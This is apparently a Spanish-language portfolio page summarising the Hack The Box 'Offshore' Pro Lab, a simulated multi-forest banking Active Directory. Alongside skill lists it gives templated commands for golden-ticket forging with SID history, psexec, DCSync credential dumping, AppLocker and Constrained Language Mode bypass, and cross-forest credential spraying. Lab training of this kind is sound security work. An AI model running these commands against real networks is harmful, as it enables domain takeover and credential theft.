---
title: "Offshore Certified Specialist"
date: 2025-04-10
level: "Hard"
platform: "Hack The Box"
category: "Pro Lab"
duration: "Simulated Campaign"
image: "/images/about/Offshore.jpg"
tags: ["Banking Security", "AD Trusts", "Evasion", "Phishing"]
---

<div align="center">

![Author](https://img.shields.io/badge/Author-Flippermen-purple?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge)
![ProLab](https://img.shields.io/badge/Pro_Lab-Offshore-darkblue?style=for-the-badge)
![Level](https://img.shields.io/badge/Level-Hard-red?style=for-the-badge)
![Team](https://img.shields.io/badge/Team-CyberFlippers-blue?style=for-the-badge)

**Flippermen | CyberFlippers | UDLA-Cyber**

</div>

---

| Campo | Valor |
|-------|-------|
| Pro Lab | Offshore |
| Plataforma | Hack The Box |
| Dificultad | Hard |
| Entorno | Multi-forest AD (infraestructura bancaria) |
| Enfoque | Forest Trusts, Evasion, Phishing, Financial Sector |

## Sobre Offshore

**Offshore** es un Pro Lab de Hack The Box clasificado como **Hard**, que simula la infraestructura critica de una **institucion bancaria internacional**. El entorno presenta una arquitectura de Active Directory multi-bosque (multi-forest) con relaciones de confianza complejas entre dominios, segmentacion de red estricta y controles de seguridad avanzados — reflejando el nivel de proteccion esperado en instituciones financieras reguladas.

Lo que hace unico a Offshore es su enfoque en el escenario de **"assumed breach"** (brecha asumida): el operador comienza con un punto de apoyo limitado y debe navegar a traves de multiples bosques de Active Directory, explotando relaciones de confianza, escalando privilegios entre dominios y evadiendo controles de seguridad estrictos como AppLocker y Constrained Language Mode. El lab refleja la realidad de auditorias en el sector financiero, donde la segmentacion es paranoica y cada movimiento lateral debe ser deliberado.

**Vectores cubiertos:**
- **Multi-Forest Active Directory** — Enumeracion y explotacion de relaciones de confianza entre bosques, escalada child-to-parent, SID History injection
- **Application Whitelisting Bypass** — Evasion de AppLocker y Constrained Language Mode (CLM) en entornos PowerShell restrictivos
- **Phishing & Initial Access** — Campanas de phishing con payloads weaponizados para acceso inicial en un entorno con filtros de correo
- **Financial Sector Targeting** — Identificacion y exfiltracion de activos de alto valor (datos financieros, credenciales de sistemas criticos)
- **Advanced Pivoting** — Movimiento lateral a traves de bosques y dominios con segmentacion estricta

---

## 🔒 Confidential Assessment Profile

**Target Environment**: `International Banking Infrastructure`
**Regulatory Level**: `Financial Compliant`

---

## ⚔️ Tactical Competencies

### 1. Forest Trust Exploitation
*   **Enterprise Recon**: Enumeracion exhaustiva de relaciones de confianza entre bosques (Forest Trusts), incluyendo tipo de confianza (bidireccional/unidireccional), filtrado SID y scope.
*   **Child-to-Parent Escalation**: Escalada desde subdominios comprometidos hacia el dominio raiz del bosque, abusando de la relacion de confianza implicita child-to-parent.
*   **SID History Injection**: Migracion de privilegios entre dominios de seguridad mediante inyeccion de SID history, permitiendo acceso cross-domain con privilegios de Enterprise Admin.
*   **Cross-Forest Attacks**: Explotacion de confianzas entre bosques para comprometer dominios en bosques separados — abuso de cuentas con SID filtering deshabilitado.

### 2. Advanced Evasion
*   **AppLocker Bypass**: Ejecucion de codigo arbitrario bajo politicas de listas blancas estrictas utilizando LOLBins (MSBuild.exe, InstallUtil.exe, Regsvr32.exe) y tecnicas de alternate execution.
*   **Constrained Language Mode**: Operacion en entornos PowerShell restringidos donde solo cmdlets nativas estan permitidas — uso de .NET directo, runspaces y tecnicas de bypass de CLM.
*   **AMSI & ETW Bypass**: Neutralizacion de Anti-Malware Scan Interface y Event Tracing for Windows para ejecucion de herramientas ofensivas sin deteccion.
*   **Living Off The Land**: Uso exclusivo de herramientas y binarios nativos del sistema para minimizar la huella y evitar deteccion por firmas.

### 3. Financial Sector Vectors
*   **Banking Infrastructure Mapping**: Comprension operativa de la arquitectura de redes financieras — segmentacion entre front-office, back-office, DMZ y sistemas de procesamiento de pagos.
*   **High Value Asset Mining**: Identificacion y priorizacion de "Joyas de la Corona" — bases de datos financieras, sistemas de transferencias, repositorios de credenciales de servicios criticos.
*   **Data Exfiltration under Constraints**: Extraccion de datos sensibles a traves de canales controlados, respetando la segmentacion y evitando DLP (Data Loss Prevention).

### 4. Active Directory Multi-Domain Operations
*   **Trust Enumeration**: Mapeo completo de la topologia de confianza entre dominios y bosques, identificando rutas de escalada cross-domain.
*   **Kerberos Cross-Domain**: Ataques Kerberos que atraviesan limites de dominio — referral tickets, inter-realm TGTs, y manipulacion de PAC (Privilege Attribute Certificate).
*   **Group Policy Across Domains**: Identificacion de GPOs que afectan multiples dominios y su potencial como vector de despliegue lateral.

## Metodologia Aplicada

### 1. Enumeracion de Confianzas y Bosques

```powershell
# Enumerar relaciones de confianza
Get-ADTrust -Filter * | Select Name, Direction, TrustType, IntraForest
nltest /domain_trusts /all_trusts

# Enumerar bosques remotos
Get-ADForest -Server <remote_forest>
Get-ADDomain -Server <remote_domain>

# BloodHound multi-dominio
bloodhound-python -u <user> -p '<pass>' -d <domain1> -c All -ns <DC1_IP>
bloodhound-python -u <user> -p '<pass>' -d <domain2> -c All -ns <DC2_IP>
```

### 2. Escalada Child-to-Parent

```bash
# Obtener SID del dominio padre
lookupsid.py <domain>/<user>:'<pass>'@<DC_IP> 0

# Crear Golden Ticket con SID History (Enterprise Admin)
ticketer.py -nthash <krbtgt_hash> -domain-sid <child_SID> \
    -domain <child_domain> -extra-sid <parent_SID>-519 administrator

# Usar el ticket para acceder al dominio padre
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass <parent_domain>/administrator@<parent_DC> -dc-ip <parent_DC_IP>
```

### 3. Bypass de AppLocker y CLM

```powershell
# Verificar politicas de AppLocker activas
Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections

# Bypass via MSBuild.exe (LOLBin de confianza)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.csproj

# Bypass de Constrained Language Mode
# Verificar modo actual
$ExecutionContext.SessionState.LanguageMode

# PowerShell downgrade attack (si v2 disponible)
powershell -version 2 -ep bypass

# Alternativa: Ejecucion directa de .NET assembly
[System.Reflection.Assembly]::Load([IO.File]::ReadAllBytes("C:\path\tool.exe"))
```

### 4. Movimiento Lateral Cross-Forest

```bash
# Validar credenciales contra multiples dominios
crackmapexec smb <DC_forest1> <DC_forest2> -u <user> -p '<pass>'

# Acceso cross-forest con credenciales obtenidas
evil-winrm -i <target_in_other_forest> -u <user>@<other_domain> -p '<pass>'

# Enumeracion de shares en dominio remoto
smbclient -L //<remote_server> -U '<domain>\<user>%<pass>'

# DCSync en dominio comprometido
secretsdump.py <domain>/<admin>:'<pass>'@<DC_IP> -just-dc
```

## Herramientas Utilizadas

| Herramienta | Proposito |
|-------------|-----------|
| `BloodHound / SharpHound` | Mapeo de rutas de ataque multi-dominio |
| `Impacket (ticketer, psexec, secretsdump, lookupsid)` | Ataques Kerberos cross-domain y credential dumping |
| `Rubeus` | Manipulacion avanzada de tickets Kerberos |
| `PowerView / ADModule` | Enumeracion de confianzas, ACLs y objetos AD |
| `CrackMapExec / NetExec` | Validacion de credenciales multi-dominio |
| `Evil-WinRM` | Acceso remoto a hosts Windows |
| `MSBuild / InstallUtil` | LOLBins para bypass de AppLocker |
| `Mimikatz` | Extraccion de credenciales y forja de tickets |
| `Chisel / Ligolo-ng` | Pivoting a traves de segmentos de red aislados |
| `Covenant / Sliver` | Frameworks C2 |

## Key Takeaways

1. **Las relaciones de confianza de AD son un multiplicador de impacto** — Un solo dominio comprometido en una arquitectura multi-forest puede ser la puerta de entrada a toda la organizacion a traves de trust exploitation.
2. **La escalada child-to-parent es un riesgo arquitectural** — La relacion de confianza implicita entre dominios hijo y padre en el mismo bosque no puede ser eliminada; solo puede ser mitigada con SID filtering y monitoreo.
3. **AppLocker no es un control de seguridad completo** — Los LOLBins proporcionan multiples rutas de bypass porque son binarios firmados por Microsoft que deben estar en la whitelist para que el sistema funcione.
4. **La segmentacion financiera anade capas reales de complejidad** — En entornos bancarios, la segmentacion de red no es solo firewalls; involucra VLANs dedicadas, jump servers obligatorios y monitoreo DLP en cada frontera.
5. **El modelo assumed breach cambia la perspectiva del auditor** — Empezar con un foothold limitado y progresar a traves de la red es mas representativo de un ataque real que buscar vulnerabilidades externas.

---

## 🏆 Operational Impact

Offshore certifica la capacidad de **auditar infraestructuras criticas financieras**. Valida la competencia para navegar la segmentacion mas estricta y comprometer arquitecturas de confianza complejas entre multiples bosques de Active Directory, todo bajo controles de seguridad avanzados (AppLocker, CLM) y con la mentalidad de un adversario que opera contra el sector financiero.

---

<div align="center">

**Flippermen**
*HackTheBox — Platinum Tier | #1 Ecuador | CyberFlippers | UDLA-Cyber*

</div>
